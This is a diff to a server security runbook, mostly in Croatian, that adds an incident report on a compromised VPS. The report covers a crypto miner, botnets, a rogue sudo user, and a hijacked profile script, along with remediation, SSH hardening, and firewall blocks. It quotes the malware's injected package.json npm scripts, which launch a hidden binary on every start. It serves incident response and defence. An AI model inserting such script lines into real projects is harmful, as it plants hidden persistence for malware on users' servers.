@@ -11,11 +11,12 @@
 
 2. **Firewall (UFW)**
    - ✅ Aktivan i enabled on boot
-   - ✅ Blokirani malicious IP-ovi: 67.217.57.240
+   - ✅ Blokirani malicious IP-ovi: 67.217.57.240, 54.213.42.128, 213.35.108.69, 157.245.93.39
    - ✅ Blokirani Docker API portovi: 2375-2377, 4243-4244
    - ✅ Blokiran SOCKS5 port: 1080
    - ✅ Blokiran Ray cluster port: 8265
-   - ✅ Dozvoljeni: 22 (SSH), 80 (HTTP), 443 (HTTPS), 3000 (Next.js), 8788 (API)
+   - ✅ Dozvoljeni: **2222 (SSH - CUSTOM PORT)**, 80 (HTTP), 443 (HTTPS)
+   - ❌ Port 22 ZATVOREN (stari SSH port - security hardening)
 
 3. **Fail2ban**
    - ✅ Instaliran i aktivan
@@ -364,8 +365,168 @@ ufw status | head -3
 
 ---
 
-**Zadnje updateano: 2025-12-11**
+---
+
+## 🚨 INCIDENT HISTORY
+
+### **INCIDENT #1: 2025-12-11 - pcpcat/xmrig Crypto Miner**
+- **Detected:** xmrig crypto miner running
+- **Action:** Process killed, binaries removed
+- **Persistence:** Systemd service removed
+- **Status:** ✅ Resolved
+
+### **INCIDENT #2: 2025-12-14 - Multi-Vector Malware Attack** 🔴
+
+#### **Attack Vectors:**
+
+1. **xmrig Crypto Miner**
+   - Resource usage: 92.5% CPU
+   - Process: `xmrig --url pool.hashvault.pro`
+   - Location: `/var/tmp/xmrig-6.24.0/`
+
+2. **javae Botnet**
+   - Systemd service: `javae.service`
+   - Persistence: Created systemd service in `/etc/systemd/system/`
+   - Repeatedly killed by OOM killer
+   - Total memory: ~2.4GB
+
+3. **n0de Botnet**
+   - Binary: `/var/tmp/.font/n0de`
+   - Network: Connected to AWS (54.213.42.128) and external IPs
+   - Companion files: `watcher.js`, `network.js`, `config.js`, `proc.js`, `utils.js`
+
+4. **package.json Compromise** ⚠️ CRITICAL
+   ```json
+   "start": "nohup /var/tmp/.font/n0de > /dev/null 2>&1 & next start"
+   "dev": "nohup /var/tmp/.font/n0de > /dev/null 2>&1 & next dev"
+   ```
+   - Malware injected directly into npm scripts
+   - Triggered on every `npm start` execution
+
+5. **Malware User Account**
+   - Username: `bqodsmyf`
+   - Privileges: `ALL=(ALL) NOPASSWD:ALL`
+   - Created in sudoers.d
+
+6. **Environment Hijacking**
+   - File: `/etc/profile.d/env.sh`
+   - Payload: `export HOME=/tmp`
+   - Purpose: Redirect dotfiles to /tmp
+
+#### **Remediation Actions Taken:**
+
+✅ **Malware Removal:**
+```bash
+# Kill all malware processes
+pkill -9 -f "xmrig|javae|n0de"
+
+# Remove binaries and directories
+rm -rf /var/tmp/xmrig-6.24.0
+rm -rf /var/tmp/.font
+rm -rf /var/tmp/.XIN-unix
+rm -f /var/tmp/*.js
+
+# Remove systemd service
+systemctl stop javae.service
+systemctl disable javae.service
+rm -f /etc/systemd/system/javae.service
+systemctl daemon-reload
+
+# Clean package.json
+sed -i 's|nohup /var/tmp/.font/n0de > /dev/null 2>&1 & ||g' /srv/thesara/app/apps/web/package.json
+
+# Remove malware user
+userdel -r bqodsmyf
+grep -l "bqodsmyf" /etc/sudoers.d/* | xargs rm -f
+
+# Remove profile hijack
+rm -f /etc/profile.d/env.sh
+```
+
+✅ **SSH Hardening (NEW):**
+```bash
+# Changed SSH port from 22 to 2222
+Port 2222
+PasswordAuthentication no
+PermitRootLogin prohibit-password
+
+# Updated firewall
+ufw allow 2222/tcp comment "SSH custom port"
+ufw delete allow 22/tcp
+ufw delete allow OpenSSH
+
+# Disabled socket-based activation
+systemctl disable ssh.socket
+systemctl enable ssh.service
+```
+
+✅ **Firewall Enhancement:**
+```bash
+# Blocked malware C&C servers
+ufw deny from 54.213.42.128 comment "Malware AWS"
+ufw deny from 213.35.108.69 comment "Malware IP"
+ufw deny from 157.245.93.39 comment "Malware IP"
+```
+
+✅ **Enhanced Monitoring:**
+```bash
+# Updated security-check.sh to detect:
+# - n0de processes
+# - Suspicious .js files in /tmp and /var/tmp
+# - Cache files (excluded: node_modules, .cache)
+```
+
+#### **Root Cause Analysis:**
+
+**Attack Vector:** Likely SSH brute force or compromised credentials on default port 22
+
+**Persistence Mechanisms Found:**
+1. ✅ Systemd services (`javae.service`)
+2. ✅ npm package.json scripts injection
+3. ✅ Profile.d script (`env.sh`)
+4. ✅ Malware user with sudo access
+5. ✅ Hidden directories in /var/tmp
+
+**What Wasn't Compromised:**
+- ✅ Git repository (clean)
+- ✅ Local development machine (clean)
+- ✅ GitHub account (no malicious commits)
+- ✅ Application secrets (.env files - assumed safe)
+
+#### **Prevention Measures Implemented:**
+
+1. **SSH Hardening:**
+   - Custom port (2222) instead of default 22
+   - Password authentication disabled
+   - Only SSH key authentication allowed
+
+2. **Monitoring:**
+   - Enhanced `security-check.sh` script
+   - Daily security reports via email
+
+3. **Network Security:**
+   - Malware C&C servers blocked in firewall
+   - Docker API ports remain blocked
+   - Only essential ports open
+
+#### **Lessons Learned:**
+
+⚠️ **CRITICAL FINDING:** Malware modified `package.json` **directly on the server**
+- Git history was clean
+- Local code was clean
+- Attack happened post-deployment
+
+🔒 **New Security Policy:**
+1. NEVER edit files directly on server
+2. ALWAYS deploy from Git
+3. Monitor package.json for unauthorized changes
+4. Verify file integrity after deployment
+
+---
+
+**Zadnje updateano: 2025-12-14**
 **Server: vps-thesaraspace.plusvps.com**
-**Status: 🟢 SECURE**
+**Status: 🟢 SECURE & HARDENED**
+**SSH Port: 2222** ⚠️ (Changed from 22)
 **Email Monitoring: ✅ ACTIVE**
 **Daily Reports: reports@thesara.space**
